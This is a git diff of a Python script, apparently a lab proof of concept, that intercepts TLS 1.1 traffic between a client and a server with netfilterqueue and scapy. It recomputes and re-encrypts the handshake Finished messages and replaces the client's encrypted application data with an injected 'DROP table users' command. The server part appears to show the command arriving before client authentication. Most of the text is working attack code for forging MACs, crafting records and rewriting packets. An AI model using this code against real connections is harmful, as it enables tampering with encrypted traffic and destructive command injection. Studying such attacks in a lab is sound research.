-                f"(server concat) unencrypted client finished of {len(decrypted_client_finished_only_handshake_message)} bytes: " + str(
-                    decrypted_client_finished_only_handshake_message))
+                server_finished_concatenation += decrypted_client_finished_only_handshake_message
+                print(
+                    f"(server concat) unencrypted client finished of {len(decrypted_client_finished_only_handshake_message)} bytes: " + str(
+                        decrypted_client_finished_only_handshake_message))
 
-            #now the 12 byte verify field
-            new_verify_field = tls_1_1_prf.compute_verify_data("client", "write", client_finished_concatenation, computed_master_key)
-            print(f"Computed verify... " + str(new_verify_field))
+                #now the 12 byte verify field
+                new_verify_field = tls_1_1_prf.compute_verify_data("client", "write", client_finished_concatenation, computed_master_key)
+                print(f"Computed verify... " + str(new_verify_field))
 
-            #we need to append initially the following 4 bytes, 1 for the type, 3 for the length
-            # appendix A.4 and A 4.4 RFC 4346 (FInished message)
-            # first off, we need to create an intermediary plaintext ( this is the same as section 6.2.2, 6.2.1 RFC 4346,
-            # TLSPlaintext and TLSCompressed since compression is off): this is effectively an Handshake message which goes as a
-            # "fragment"
-            temp_pre_encryption = b'\x14\x00\x00\x0C' + new_verify_field # Handshake header and Finished field, handshake type = 0x16 or 20 decimal ("finished" HandshakeType)
-
-
-            # LET'S ENCRYPT!
-
-            #so, the temp_pre_encryption is a Handshake struct ok? Now... that struct gets put in a TLSPlaintext struct as
-            # the "opaque fragment" field. This TLSPlaintext becomes a TLSCompressed struct (via CompressionMethod.null, which
-            # doesn't change it, effectively fragment of this new TLSCOmpressed is the same as the old one). THis TLSCompressed
-            # becomes a TLSCiphertext struct, which you can see an example (original packet) printed in the screenshot in the app folder...
-            # we printed it via the print(....show2()) function
-
-            #anyways... we need to create the "raw" field that you can see in the screenshot, which is the fragment of the TLSCIphertext,
-            # when case block is chosen... so we follow the construction of GenericBlockCIpher!
-
-            # RECIPE FOR THE MAC!
-            # sequence number at 0 for handshake messages (8 bytes)
-            # 1 byte content type at 0x16 for handshake messages
-            # tls version (0x0302 for tls 1.1)
-            # 2 bytes plaintext length (16 for the temp_pre_encryption bytestring)
-            # plaintext (temp_pre_encryption)
-            intermediary_plaintext = b'\x00'*8 + b'\x16' + b'\x03\x02' + b'\x00\x10' + temp_pre_encryption
-
-            h = HMAC(client_write_MAC_secret, hashes.SHA1())
-            h.update(intermediary_plaintext)
-            signature = h.finalize() # MAC[CipherSpec.hash_size] = MAC[20 BYTES]
-            print(b"Signature: " + signature)
-
-            # RECIPE FOR GenericBlockCipher
-            # IV [16 bytes]
-            # content (intermediary_plaintext) [16 bytes]
-            # MAC [20 bytes]
-            # padding (must be a multiple of 16 bytes, the block length of our AES256 cipher, so with 53 as the sum of IV, content and MAC and padding length, we need 11 padding bytes, and the padding bytes will be b'0x0B')
-            # padding length 1
-
-            cipher = CipherBase(AES256(client_write_key), CBC(client_write_IV))
-            encryptor = cipher.encryptor()
-            plaintext = temp_pre_encryption + signature # only these two as the plaintext, choose a random IV and prepend it after you encrypt this plaintext...
-
-            padding_length = 16 - (len(plaintext) % 16)
-            if padding_length == 0:
-                padding_length = 16
-            padding = (chr(padding_length - 1) * padding_length).encode()
-
-            plaintext += padding
-
-            print(b"plaintext: " + plaintext)
-            print("padded plaintext length: " + str(len(plaintext)))
-
-            ct = encryptor.update(plaintext) + encryptor.finalize()
-
-            #final payload will be IV and ct concatenated!
-            # according to section 6.2.3.2 of RFC 4346 and my tests, i found out that IV gets prepended to the ciphertext, before
-            # getting sent... there is even another option, which is to set the "cipher" IV to 0 and encrypt "our" IV by prepending it to the ciphertext, like the
-            # one calculated in the KDF, as the FIRST block, then just send the ciphertext (WITHOUT PREPENDING THE "cipher" IV to the ciphertext) (option 2.a page 22 rfc 4346)
-            # In either way, it seems that the tlslite-ng implementation uses the first option and generates the IV separately
-            # for each Record, as per point 1 of page 22 of RFC 4346 (look session.py "derive_keys" of that library!)...
-            ct = client_write_IV + ct # prepend the "random" IV... who cares if we don't generate it as per RFC... WE'RE THE ATTACKERS!
-
-            print(b"Ciphertext: " + ct)
-            print("Ciphertext length: " + str(len(ct)))
-
-            print(scpy_pkt.show2())
-
-            final_packet_after_manual_insertion = IP(bytes(scpy_pkt)[0:-(len(ct))] + ct)
-
-            del final_packet_after_manual_insertion["TCP"].chksum
-            del final_packet_after_manual_insertion["IP"].chksum
-            del final_packet_after_manual_insertion["IP"].len
-            print(final_packet_after_manual_insertion.show2())
+                #we need to append initially the following 4 bytes, 1 for the type, 3 for the length
+                # appendix A.4 and A 4.4 RFC 4346 (FInished message)
+                # first off, we need to create an intermediary plaintext ( this is the same as section 6.2.2, 6.2.1 RFC 4346,
+                # TLSPlaintext and TLSCompressed since compression is off): this is effectively an Handshake message which goes as a
+                # "fragment"
+                temp_pre_encryption = b'\x14\x00\x00\x0C' + new_verify_field # Handshake header and Finished field, handshake type = 0x16 or 20 decimal ("finished" HandshakeType)
 
 
-            pkt.set_payload(bytes(final_packet_after_manual_insertion))
+                # LET'S ENCRYPT!
 
-        elif scpy_pkt.haslayer(TLSChangeCipherSpec) and scpy_pkt.src == "172.18.0.3": # SERVER CHANGE CIPHER AND SERVER'S Finished message!
-            # fourth and final stage of the handshake, got to modify the TLS server finished message and inject an unauthenticated command!
-            print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
-            print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
-            print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
-            print("TLS server change cipher spec captured")
-            scpy_pkt.show2()
-            print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
-            print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
-            print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
+                #so, the temp_pre_encryption is a Handshake struct ok? Now... that struct gets put in a TLSPlaintext struct as
+                # the "opaque fragment" field. This TLSPlaintext becomes a TLSCompressed struct (via CompressionMethod.null, which
+                # doesn't change it, effectively fragment of this new TLSCOmpressed is the same as the old one). THis TLSCompressed
+                # becomes a TLSCiphertext struct, which you can see an example (original packet) printed in the screenshot in the app folder...
+                # we printed it via the print(....show2()) function
 
-            # how many TLS records are stacked in this message?
-            n_tls_records = count_TLS_nested_layers(scpy_pkt["TCP"])  # don't count TCP layer...
-            print("n_tls_records: " + str(n_tls_records))
+                #anyways... we need to create the "raw" field that you can see in the screenshot, which is the fragment of the TLSCIphertext,
+                # when case block is chosen... so we follow the construction of GenericBlockCIpher!
 
-            tls_record_of_finished_message = -1
+                # RECIPE FOR THE MAC!
+                # sequence number at 0 for handshake messages (8 bytes)
+                # 1 byte content type at 0x16 for handshake messages
+                # tls version (0x0302 for tls 1.1)
+                # 2 bytes plaintext length (16 for the temp_pre_encryption bytestring)
+                # plaintext (temp_pre_encryption)
+                intermediary_plaintext = b'\x00'*8 + b'\x16' + b'\x03\x02' + b'\x00\x10' + temp_pre_encryption
 
-            change_cipher_spec_encountered = False  # as per rfc section 7.4.9 start, we expect not encountering any more
-                                                    # handshake messages encapsulated in TLS frames, so we can stop
-                                                    # concatenating them inside the relative concatenation strings
+                h = HMAC(client_write_MAC_secret, hashes.SHA1())
+                h.update(intermediary_plaintext)
+                signature = h.finalize() # MAC[CipherSpec.hash_size] = MAC[20 BYTES]
+                print(b"Signature: " + signature)
 
-            # pick the key exchange message...
-            for i in range(1, n_tls_records + 1):
-                generic_tls_layer = scpy_pkt[TLS].getlayer("TLS",
-                                                           i)  # each TLS message is wrapped inside a generic TLS layer,
-                # which has a type, a version, a len and an iv field...
+                # RECIPE FOR GenericBlockCipher
+                # IV [16 bytes]
+                # content (intermediary_plaintext) [16 bytes]
+                # MAC [20 bytes]
+                # padding (must be a multiple of 16 bytes, the block length of our AES256 cipher, so with 53 as the sum of IV, content and MAC and padding length, we need 11 padding bytes, and the padding bytes will be b'0x0B')
+                # padding length 1
 
-                if TLS_record_contains_message_of_type(generic_tls_layer,
-                                                       TLSChangeCipherSpec):
-                    print("SERVER CHANGE CIPHER SPEC!!!! IGNORING!!!!")
-                    change_cipher_spec_encountered = True
+                cipher = CipherBase(AES256(client_write_key), CBC(client_write_IV))
+                encryptor = cipher.encryptor()
+                plaintext = temp_pre_encryption + signature # only these two as the plaintext, choose a random IV and prepend it after you encrypt this plaintext...
 
-                    tls_record_of_finished_message = i + 1
-                elif i == tls_record_of_finished_message: # handshake message containing an encrypted message
-                    # ok, like in the third step, but this time from the server's perspective!
-                    print("Server finished message, we need to stop taking into consideration any more TLS records...")
+                padding_length = 16 - (len(plaintext) % 16)
+                if padding_length == 0:
+                    padding_length = 16
+                padding = (chr(padding_length - 1) * padding_length).encode()
 
-                    # now the 12 byte verify field
-                    new_verify_field = tls_1_1_prf.compute_verify_data("server", "write", server_finished_concatenation,
-                                                                       computed_master_key)
+                plaintext += padding
 
-                    print(f"Computed verify... " + str(new_verify_field))
+                print(b"plaintext: " + plaintext)
+                print("padded plaintext length: " + str(len(plaintext)))
 
-                    # we need to append initially the following 4 bytes, 1 for the type, 3 for the length
-                    # appendix A.4 and A 4.4 RFC 4346 (FInished message)
-                    # first off, we need to create an intermediary plaintext ( this is the same as section 6.2.2, 6.2.1 RFC 4346,
-                    # TLSPlaintext and TLSCompressed since compression is off): this is effectively an Handshake message which goes as a
-                    # "fragment"
-                    temp_pre_encryption = b'\x14\x00\x00\x0C' + new_verify_field  # Handshake header and Finished field, handshake type = 0x16 or 20 decimal ("finished" HandshakeType)
+                ct = encryptor.update(plaintext) + encryptor.finalize()
 
+                #final payload will be IV and ct concatenated!
+                # according to section 6.2.3.2 of RFC 4346 and my tests, i found out that IV gets prepended to the ciphertext, before
+                # getting sent... there is even another option, which is to set the "cipher" IV to 0 and encrypt "our" IV by prepending it to the ciphertext, like the
+                # one calculated in the KDF, as the FIRST block, then just send the ciphertext (WITHOUT PREPENDING THE "cipher" IV to the ciphertext) (option 2.a page 22 rfc 4346)
+                # In either way, it seems that the tlslite-ng implementation uses the first option and generates the IV separately
+                # for each Record, as per point 1 of page 22 of RFC 4346 (look session.py "derive_keys" of that library!)...
+                ct = client_write_IV + ct # prepend the "random" IV... who cares if we don't generate it as per RFC... WE'RE THE ATTACKERS!
+
+                print(b"Ciphertext: " + ct)
+                print("Ciphertext length: " + str(len(ct)))
+
+                print(scpy_pkt.show2())
+
+                final_packet_after_manual_insertion = IP(bytes(scpy_pkt)[0:-(len(ct))] + ct)
+
+                del final_packet_after_manual_insertion["TCP"].chksum
+                del final_packet_after_manual_insertion["IP"].chksum
+                del final_packet_after_manual_insertion["IP"].len
+                print(final_packet_after_manual_insertion.show2())
+
+
+                pkt.set_payload(bytes(final_packet_after_manual_insertion))
+
+            elif scpy_pkt.haslayer(TLSChangeCipherSpec) and scpy_pkt.src == "172.18.0.3": # SERVER CHANGE CIPHER AND SERVER'S Finished message!
+                # fourth and final stage of the handshake, got to modify the TLS server finished message and inject an unauthenticated command!
+                print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
+                print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
+                print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
+                print("TLS server change cipher spec captured")
+                scpy_pkt.show2()
+                print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
+                print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
+                print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
+
+                # how many TLS records are stacked in this message?
+                n_tls_records = count_TLS_nested_layers(scpy_pkt["TCP"])  # don't count TCP layer...
+                print("n_tls_records: " + str(n_tls_records))
+
+                tls_record_of_finished_message = -1
+
+                change_cipher_spec_encountered = False  # as per rfc section 7.4.9 start, we expect not encountering any more
+                                                        # handshake messages encapsulated in TLS frames, so we can stop
+                                                        # concatenating them inside the relative concatenation strings
+
+                # pick the key exchange message...
+                for i in range(1, n_tls_records + 1):
+                    generic_tls_layer = scpy_pkt[TLS].getlayer("TLS",
+                                                               i)  # each TLS message is wrapped inside a generic TLS layer,
+                    # which has a type, a version, a len and an iv field...
+
+                    if TLS_record_contains_message_of_type(generic_tls_layer,
+                                                           TLSChangeCipherSpec):
+                        print("SERVER CHANGE CIPHER SPEC!!!! IGNORING!!!!")
+                        change_cipher_spec_encountered = True
+
+                        tls_record_of_finished_message = i + 1
+                    elif i == tls_record_of_finished_message: # handshake message containing an encrypted message
+                        # ok, like in the third step, but this time from the server's perspective!
+                        print("Server finished message, we need to stop taking into consideration any more TLS records...")
+
+                        # now the 12 byte verify field
+                        new_verify_field = tls_1_1_prf.compute_verify_data("server", "write", server_finished_concatenation,
+                                                                           computed_master_key)
+
+                        print(f"Computed verify... " + str(new_verify_field))
+
+                        # we need to append initially the following 4 bytes, 1 for the type, 3 for the length
+                        # appendix A.4 and A 4.4 RFC 4346 (FInished message)
+                        # first off, we need to create an intermediary plaintext ( this is the same as section 6.2.2, 6.2.1 RFC 4346,
+                        # TLSPlaintext and TLSCompressed since compression is off): this is effectively an Handshake message which goes as a
+                        # "fragment"
+                        temp_pre_encryption = b'\x14\x00\x00\x0C' + new_verify_field  # Handshake header and Finished field, handshake type = 0x16 or 20 decimal ("finished" HandshakeType)
+
+                        # LET'S ENCRYPT!
+
+                        # so, the temp_pre_encryption is a Handshake struct ok? Now... that struct gets put in a TLSPlaintext struct as
+                        # the "opaque fragment" field. This TLSPlaintext becomes a TLSCompressed struct (via CompressionMethod.null, which
+                        # doesn't change it, effectively fragment of this new TLSCOmpressed is the same as the old one). THis TLSCompressed
+                        # becomes a TLSCiphertext struct, which you can see an example (original packet) printed in the screenshot in the app folder...
+                        # we printed it via the print(....show2()) function
+
+                        # anyways... we need to create the "raw" field that you can see in the screenshot, which is the fragment of the TLSCIphertext,
+                        # when case block is chosen... so we follow the construction of GenericBlockCIpher!
+
+                        # RECIPE FOR THE MAC!
+                        # sequence number at 0 for handshake messages (8 bytes) (this is the first for the server "end"!!!!)
+                        # 1 byte content type at 0x16 for handshake messages
+                        # tls version (0x0302 for tls 1.1)
+                        # 2 bytes plaintext length (16 for the temp_pre_encryption bytestring)
+                        # plaintext (temp_pre_encryption)
+                        intermediary_plaintext = b'\x00' * 8 + b'\x16' + b'\x03\x02' + b'\x00\x10' + temp_pre_encryption
+
+                        from cryptography.hazmat.primitives import hashes, hmac
+
+                        h = hmac.HMAC(server_write_MAC_secret, hashes.SHA1())
+                        h.update(intermediary_plaintext)
+                        signature = h.finalize()  # MAC[CipherSpec.hash_size] = MAC[20 BYTES]
+                        print(b"Signature: " + signature)
+
+                        # RECIPE FOR GenericBlockCipher
+                        # IV [16 bytes]
+                        # content (intermediary_plaintext) [16 bytes]
+                        # MAC [20 bytes]
+                        # padding (must be a multiple of 16 bytes, the block length of our AES256 cipher, so with 53 as the sum of IV, content and MAC and padding length, we need 11 padding bytes, and the padding bytes will be b'0x0B')
+                        # padding length 1
+                        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+
+                        cipher = Cipher(algorithms.AES256(server_write_key), modes.CBC(server_write_IV))
+                        encryptor = cipher.encryptor()
+                        plaintext = temp_pre_encryption + signature  # only these two as the plaintext, choose a random IV and prepend it after you encrypt this plaintext...
+
+                        padding_length = 16 - (len(plaintext) % 16)
+                        if padding_length == 0:
+                            padding_length = 16
+                        padding = (chr(padding_length - 1) * padding_length).encode()
+
+                        plaintext += padding
+
+                        print(b"plaintext: " + plaintext)
+                        print("padded plaintext length: " + str(len(plaintext)))
+
+                        ct = encryptor.update(plaintext) + encryptor.finalize()
+
+                        # final payload will be IV and ct concatenated!
+                        # according to section 6.2.3.2 of RFC 4346 and my tests, i found out that IV gets prepended to the ciphertext, before
+                        # getting sent... there is even another option, which is to set the "cipher" IV to 0 and encrypt "our" IV by prepending it to the ciphertext, like the
+                        # one calculated in the KDF, as the FIRST block, then just send the ciphertext (WITHOUT PREPENDING THE "cipher" IV to the ciphertext) (option 2.a page 22 rfc 4346)
+                        # In either way, it seems that the tlslite-ng implementation uses the first option and generates the IV separately
+                        # for each Record, as per point 1 of page 22 of RFC 4346 (look session.py "derive_keys" of that library!)...
+                        ct = server_write_IV + ct  # prepend the "random" IV... who cares if we don't generate it as per RFC... WE'RE THE ATTACKERS!
+
+                        print(b"Ciphertext: " + ct)
+                        print("Ciphertext length: " + str(len(ct)))
+
+                        print(scpy_pkt.show2())
+
+                        final_packet_after_manual_insertion = IP(bytes(scpy_pkt)[0:-(len(ct))] + ct)
+
+                        del final_packet_after_manual_insertion["TCP"].chksum
+                        del final_packet_after_manual_insertion["IP"].chksum
+                        del final_packet_after_manual_insertion["IP"].len
+                        print(final_packet_after_manual_insertion.show2())
+
+                        pkt.set_payload(bytes(final_packet_after_manual_insertion))
+                        pkt.accept()
+
+                        handshake_mangled = True
+                        return
+
+                    else:
+                        print(
+                            "Check if this message was the last unknown, in that case this is an encrypted server finished message...")
+                        print("Unknown TLS layer type encountered before change cipher spec...")
+                        if not change_cipher_spec_encountered:
+                            print("Still, we are saving it inside the concatenation...")
+
+                            # for the server finished message we take the TLS record's content BEFORE changing them
+                            server_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
+                            print(f"(server concat)generic tls layer {i} length: " + str(
+                                len(get_handshake_message_bytes(generic_tls_layer))))
+
+
+                        print("TLS client finished message captured? check if the numbers are the same")
+                        print(
+                            f"Calculated tls record number: {i}; Actual tls record number: {tls_record_of_finished_message}")
+
+            pkt.accept()
+        else:
+            # handshake was done, as a demonstration mangle the first data packet and show that server receives the mangled version...
+            # instead of crafting a new one from ground up (in the end, to show mangling was successfull it is better to do that)
+            #todo: maybe write both versions and let a switch decide?
+
+            if scpy_pkt.haslayer(TLSApplicationData):
+
+                if not applicationdata_mangled:
+
+                    iv = (bytes(scpy_pkt)[-64:])[
+                        0:16]  # take the first 16 bytes of the encrypted payload, that's the IV used by the real client to encrypt the message...
+                    print(b"iv used by the client: " + iv)
+                    print("iv used by the client (hex): " + iv.hex())
+
+                    cipher_decrypt = CipherBase(AES256(client_write_key), CBC(iv))
+                    decryptor = cipher_decrypt.decryptor()
+                    decrypted_client_message = decryptor.update((bytes(scpy_pkt)[-64:])) + decryptor.finalize()
+                    print("Decrypted client message (hex): " + decrypted_client_message.hex())
+                    length_of_plaintext_message = len(decrypted_client_message) - 20 - decrypted_client_message[-1] - 16 - 1 # - sha 1 mac - padding - IV - padding size byte
+                    print("Decrypted client message length: " + str(length_of_plaintext_message))
+                    print(b"Decrypted client message (only human readable): " + decrypted_client_message[16:(16+length_of_plaintext_message)])
+
+                    # application data record to be encrypted, added header on the left, handshake type = 0x17 or 23 decimal (application data header),
+                    # length len(b"DROP table\x00") = 11, so we add the remaining bytes to reach the same length
+                    temp_pre_encryption = b'DROP table users' + (b'\x00'*(length_of_plaintext_message - len(b'DROP table users')))
+                    real_length = len(temp_pre_encryption)
+                    print("final plaintext" + str(temp_pre_encryption))
+                    print("final plaintext message length: " + str(real_length))
                     # LET'S ENCRYPT!
+                    print(b"payload: " + temp_pre_encryption)
 
                     # so, the temp_pre_encryption is a Handshake struct ok? Now... that struct gets put in a TLSPlaintext struct as
                     # the "opaque fragment" field. This TLSPlaintext becomes a TLSCompressed struct (via CompressionMethod.null, which
@@ -661,16 +795,19 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
                     # when case block is chosen... so we follow the construction of GenericBlockCIpher!
 
                     # RECIPE FOR THE MAC!
-                    # sequence number at 0 for handshake messages (8 bytes) (this is the first for the server "end"!!!!)
-                    # 1 byte content type at 0x16 for handshake messages
+                    # sequence number at 1 for the first application data message (8 bytes) (this is the first for the server "end"!!!!)
+                    # 1 byte content type at 0x17 (23) for application data messages
                     # tls version (0x0302 for tls 1.1)
                     # 2 bytes plaintext length (16 for the temp_pre_encryption bytestring)
                     # plaintext (temp_pre_encryption)
-                    intermediary_plaintext = b'\x00' * 8 + b'\x16' + b'\x03\x02' + b'\x00\x10' + temp_pre_encryption
+                    intermediary_plaintext = b'\x00' * 7 + b'\x01' + b'\x17' + b'\x03\x02' + real_length.to_bytes(2) + temp_pre_encryption
 
+                    print("intermediary_plaintext" + str(intermediary_plaintext))
+                    print("intermediary_plaintext message length: " + str(len(intermediary_plaintext)))
+                    print("intermediary_plaintext message hex: " + intermediary_plaintext.hex())
                     from cryptography.hazmat.primitives import hashes, hmac
 
-                    h = hmac.HMAC(server_write_MAC_secret, hashes.SHA1())
+                    h = hmac.HMAC(client_write_MAC_secret, hashes.SHA1())
                     h.update(intermediary_plaintext)
                     signature = h.finalize()  # MAC[CipherSpec.hash_size] = MAC[20 BYTES]
                     print(b"Signature: " + signature)
@@ -683,7 +820,7 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
                     # padding length 1
                     from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
-                    cipher = Cipher(algorithms.AES256(server_write_key), modes.CBC(server_write_IV))
+                    cipher = Cipher(algorithms.AES256(client_write_key), modes.CBC(client_write_IV))
                     encryptor = cipher.encryptor()
                     plaintext = temp_pre_encryption + signature  # only these two as the plaintext, choose a random IV and prepend it after you encrypt this plaintext...
 
@@ -705,7 +842,7 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
                     # one calculated in the KDF, as the FIRST block, then just send the ciphertext (WITHOUT PREPENDING THE "cipher" IV to the ciphertext) (option 2.a page 22 rfc 4346)
                     # In either way, it seems that the tlslite-ng implementation uses the first option and generates the IV separately
                     # for each Record, as per point 1 of page 22 of RFC 4346 (look session.py "derive_keys" of that library!)...
-                    ct = server_write_IV + ct  # prepend the "random" IV... who cares if we don't generate it as per RFC... WE'RE THE ATTACKERS!
+                    ct = client_write_IV + ct  # prepend the "random" IV... who cares if we don't generate it as per RFC... WE'RE THE ATTACKERS!
 
                     print(b"Ciphertext: " + ct)
                     print("Ciphertext length: " + str(len(ct)))
@@ -720,30 +857,14 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
                     print(final_packet_after_manual_insertion.show2())
 
                     pkt.set_payload(bytes(final_packet_after_manual_insertion))
-                    pkt.accept()
-                    return
-
-                else:
-                    print(
-                        "Check if this message was the last unknown, in that case this is an encrypted server finished message...")
-                    print("Unknown TLS layer type encountered before change cipher spec...")
-                    if not change_cipher_spec_encountered:
-                        print("Still, we are saving it inside the concatenation...")
-
-                        # for the server finished message we take the TLS record's content BEFORE changing them
-                        server_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
-                        print(f"(server concat)generic tls layer {i} length: " + str(
-                            len(get_handshake_message_bytes(generic_tls_layer))))
 
 
-                    print("TLS client finished message captured? check if the numbers are the same")
-                    print(
-                        f"Calculated tls record number: {i}; Actual tls record number: {tls_record_of_finished_message}")
+                    applicationdata_mangled  = True
 
 
+            pkt.accept()
 
 
-        pkt.accept()
     else:
 
         pkt.accept()
@@ -819,11 +940,34 @@ if __name__ == '__main__':
                                      # checker= Checker(x509Fingerprint=server_certificate.getFingerprint())
                                      )  # we pass the client certificate and private key to the function, even if the server will not (initially, phase 1) ask for it.
             print("Handshake done")
-
-            conn.sendall(b"Send 50 to Alice")
-            sleep(5)
-
             oldSession = conn.session
+            error_last_connection = False
+            while True:
+                if conn.closed or error_last_connection: #retry to connect with session resumption...
+                    try:
+                        conn.close()
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(5)
+                        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                        sock.connect(("172.18.0.3", 443))
+                        # step 2. construct a TLSConnection
+                        conn = tlslite.TLSConnection(sock)
+                        conn.handshakeClientCert(chain,
+                                                 private_key,
+                                                 session=oldSession,
+                                                 settings=settings)
+                        oldSession = conn.session
+                        error_last_connection = False
+                    except Exception as e:
+                        print(e)
+                try:
+                    conn.sendall(b"Send 50 to Alice")
+                except Exception as e:
+                    error_last_connection = True
+                    print(e) # just get the connection closed exception or broken pipe...
+
+                sleep(5)
+
 
 
         except Exception as e:
@@ -874,17 +1018,52 @@ if __name__ == '__main__':
         # session cache active, so we can resume laster
         sessionCache = SessionCache()
 
+        auth_needed = False
         try:
             conn.handshakeServer(certChain=chain,
                                  privateKey=private_key,
                                  settings=settings,
                                  sessionCache=sessionCache,
                                  #checker=Checker(client_certificate.getFingerprint()),
-                                 reqCert=False)  # we pass the server certificate and private key to the function
+                                 reqCert=False or auth_needed)  # we pass the server certificate and private key to the function
             print("Handshake done")
+            msg = None
+            while True:
 
-            msg = conn.recv(1024)
-            print(msg)
+                if auth_needed:
+
+                    try:
+                        conn.close()
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                        # step 1s. bind the socket to our address (SERVER) and port, and start listening...
+                        sock.bind(("172.18.0.3", 443))
+                        sock.listen(1)
+                        real_sock, client_address = sock.accept()  # accept returns a new socket object, representing the newly socket connected to the client! The old one continues to listen for new connections...
+                        real_sock.settimeout(20)
+                        print(f"connected to {client_address}")
+
+                        # step 2. construct a TLSConnection
+                        conn = tlslite.TLSConnection(real_sock)
+                        conn.handshakeServer(certChain=chain,
+                                             privateKey=private_key,
+                                             settings=settings,
+                                             sessionCache=sessionCache,
+                                             checker=Checker(client_certificate.getFingerprint(), checkResumedSession=True),
+                                             reqCert=True)  # we pass the server certificate and private key to the function
+                        print(b"Client authed and executed this command : " + msg)
+                        auth_needed = False
+                    except Exception as e:
+                        print(e)
+
+                else:
+                    msg = conn.recv(1024)
+                    print(msg)
+
+                    if b"DROP table" in msg:
+                        print("Received unauthenticated DROP command... proceeding to auth...")
+                        auth_needed = True
+                        continue
 
 
         except Exception as e:
